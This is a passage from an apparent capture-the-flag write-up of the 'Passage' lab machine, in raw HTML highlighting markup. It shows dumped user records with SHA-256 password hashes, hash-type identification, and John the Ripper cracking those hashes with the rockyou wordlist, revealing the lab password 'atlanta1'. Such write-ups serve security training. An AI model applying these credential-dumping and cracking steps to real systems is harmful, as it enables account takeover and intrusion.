class=o>:</span><span class=s2>&#34;cnt&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;2&#34;</span><span class=p>;}}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;id&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>i</span><span class=o>:</span><span class=mi>1598910896</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;hacker&#34;</span><span class=p>;}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;email&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>15</span><span class=o>:</span><span class=s2>&#34;cyfun@htb.local&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;cyfun&#34;</span><span class=p>;}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;id&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>i</span><span class=o>:</span><span class=mi>1592483281</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;sid-meier&#34;</span><span class=p>;}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;cyfun&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>11</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;id&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;1599484395&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;cyfun&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;acl&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;4&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;email&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>15</span><span class=o>:</span><span class=s2>&#34;cyfun@htb.local&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;nick&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;cyfun&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;pass&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>64</span><span class=o>:</span><span class=s2>&#34;4d9f756d36f82896d96c5e9131051117a6e8c5fd89a169f0440c46a853e2c44b&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;lts&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;1599489409&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;ban&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;0&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;more&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>60</span><span class=o>:</span><span class=s2>&#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;avatar&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>25</span><span class=o>:</span><span class=s2>&#34;avatar_cyfun_xctxudjs.php&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;e-hide&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>0</span><span class=o>:</span><span class=s2>&#34;&#34;</span><span class=p>;}}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;email&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>17</span><span class=o>:</span><span class=s2>&#34;nadav@passage.htb&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;admin&#34;</span><span class=p>;}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;email&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>15</span><span class=o>:</span><span class=s2>&#34;kim@example.com&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;kim-swift&#34;</span><span class=p>;}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;email&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>20</span><span class=o>:</span><span class=s2>&#34;hacker@hacker.hacker&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;hacker&#34;</span><span class=p>;}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;id&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>i</span><span class=o>:</span><span class=mi>1592483236</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;paul-coles&#34;</span><span class=p>;}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;sid-meier&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;id&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;1592483281&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;sid-meier&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;acl&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;3&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;email&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>15</span><span class=o>:</span><span class=s2>&#34;sid@example.com&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;nick&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;Sid Meier&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;pass&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>64</span><span class=o>:</span><span class=s2>&#34;4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;lts&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;1592485645&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;ban&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;0&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;cnt&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;2&#34;</span><span class=p>;}}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;id&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>i</span><span class=o>:</span><span class=mi>1592483047</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;admin&#34;</span><span class=p>;}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;email&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>15</span><span class=o>:</span><span class=s2>&#34;sid@example.com&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;sid-meier&#34;</span><span class=p>;}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;paul-coles&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;id&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;1592483236&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;paul-coles&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;acl&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;2&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;email&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>16</span><span class=o>:</span><span class=s2>&#34;paul@passage.htb&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;nick&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;Paul Coles&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;pass&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>64</span><span class=o>:</span><span class=s2>&#34;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;lts&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;1592485556&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;ban&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;0&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;cnt&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;2&#34;</span><span class=p>;}}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;kim-swift&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;id&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;1592483309&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;kim-swift&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;acl&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;3&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;email&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>15</span><span class=o>:</span><span class=s2>&#34;kim@example.com&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;nick&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;Kim Swift&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;pass&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>64</span><span class=o>:</span><span class=s2>&#34;f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;lts&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;1592487096&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;ban&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;0&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;cnt&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;3&#34;</span><span class=p>;}}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;egre55&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>11</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;id&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;1598829833&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;egre55&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;acl&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;4&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;email&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>15</span><span class=o>:</span><span class=s2>&#34;egre55@test.com&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;nick&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;egre55&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;pass&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>64</span><span class=o>:</span><span class=s2>&#34;4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;more&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>60</span><span class=o>:</span><span class=s2>&#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;lts&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;1598906881&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;ban&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;0&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;avatar&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>26</span><span class=o>:</span><span class=s2>&#34;avatar_egre55_ykxnacpt.php&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;e-hide&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>0</span><span class=o>:</span><span class=s2>&#34;&#34;</span><span class=p>;}</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;hacker&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>11</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;id&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;1598910896&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;hacker&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;acl&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;4&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;email&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>20</span><span class=o>:</span><span class=s2>&#34;hacker@hacker.hacker&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;nick&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;hacker&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;pass&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>64</span><span class=o>:</span><span class=s2>&#34;e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;lts&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;1598910911&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;ban&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;0&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;more&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>60</span><span class=o>:</span><span class=s2>&#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;avatar&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>26</span><span class=o>:</span><span class=s2>&#34;avatar_hacker_jpyoyskt.php&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;e-hide&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>0</span><span class=o>:</span><span class=s2>&#34;&#34;</span><span class=p>;}}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;id&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>i</span><span class=o>:</span><span class=mi>1599484395</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;cyfun&#34;</span><span class=p>;}}</span>
</span></span></code></pre></td></tr></table></div></div><p>I retrieved all the hashes to try to get them cracked.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>admin:7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
</span></span><span class=line><span class=cl>sid:4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
</span></span><span class=line><span class=cl>paul:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
</span></span><span class=line><span class=cl>kim:f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
</span></span><span class=line><span class=cl>egre55:4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
</span></span><span class=line><span class=cl>hacker:e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
</span></span></code></pre></td></tr></table></div></div><p>I used to identify the hash type that looks like SHA-256.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ haiti 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
</span></span><span class=line><span class=cl>Snefru-256 [JtR: snefru-256]
</span></span><span class=line><span class=cl>SHA-256 [HC: 1400] [JtR: raw-sha256]
</span></span><span class=line><span class=cl>RIPEMD-256
</span></span><span class=line><span class=cl>Haval-256 [JtR: haval-256-3]
</span></span><span class=line><span class=cl>GOST R 34.11-94 [HC: 6900] [JtR: gost]
</span></span><span class=line><span class=cl>GOST CryptoPro S-Box
</span></span><span class=line><span class=cl>SHA3-256 [HC: 17400]
</span></span><span class=line><span class=cl>Keccak-256 [HC: 17800] [JtR: raw-keccak-256]
</span></span><span class=line><span class=cl>Skein-256 [JtR: skein-256]
</span></span><span class=line><span class=cl>Skein-512(256)
</span></span></code></pre></td></tr></table></div></div><p>And then used John the Ripper to crack some of them:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ john hashes.txt -w /usr/share/wordlists/passwords/rockyou.txt --format=Raw-SHA256
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded 6 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 AVX 4x])
</span></span><span class=line><span class=cl>Warning: poor OpenMP scalability for this hash type, consider --fork=8
</span></span><span class=line><span class=cl>Will run 8 OpenMP threads
</span></span><span class=line><span class=cl>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span><span class=line><span class=cl>hacker           (hacker)
</span></span><span class=line><span class=cl>atlanta1         (paul)
